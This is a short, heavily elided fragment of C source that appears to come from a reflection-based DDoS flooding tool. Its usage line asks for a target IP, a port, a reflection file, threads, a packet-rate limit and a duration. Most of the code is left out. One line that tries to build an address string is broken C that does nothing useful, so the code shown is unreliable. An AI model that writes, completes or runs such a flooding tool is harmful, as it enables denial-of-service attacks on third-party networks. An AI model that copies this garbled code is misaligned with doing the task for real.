...
static unsigned char daddrtest;
struct list
{
...
{   
    ...
    char ip[17];
    snprintf(ip, sizeof(ip)-1, "%d", rand()%255);
    char * daddrlol = ("%d.%d",daddrtest,ip);
...
int main(int argc, char *argv[])
{
    if (argc < 7)
    {
        ...
        fprintf(stdout, "Usage: %s <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time> <daddr>\n", argv[0]);
        exit(-1);
    }
    srand(time(NULL));
    int i = 0;
